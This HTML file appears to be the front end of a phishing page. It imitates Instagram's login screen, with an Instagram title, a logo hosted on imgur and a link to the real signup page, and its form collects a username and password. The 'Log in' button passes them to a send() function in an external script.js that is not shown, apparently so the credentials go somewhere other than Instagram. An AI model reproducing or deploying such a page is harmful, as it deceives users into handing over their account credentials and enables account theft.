<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Log In | Instagram </title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">

<div id="wrapper" style="margin-top: 126px;">
  <div class="main-content">
    <div class="header">
      <img src="https://i.imgur.com/zqpwkLQ.png" />
    </div>
    <div class="l-part">
      <form id="form">
      <input type="text" required placeholder="Username" id="username" class="input-1" />

      <input type="password" required placeholder="Password" id="password" class="input-2" />
      </div>
      <p id="msg" style="padding: 8px; color: red"> </p>
      <div id="e"></div>
      <input type="button" onclick="send();" value="Log in" class="btn" />
    </form>
    </div>
  </div>
  <div class="sub-content">
    <p class="">
      Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
    </p>
  </div>
</div>


  <script  src="./script.js"></script>

</body>
</html>
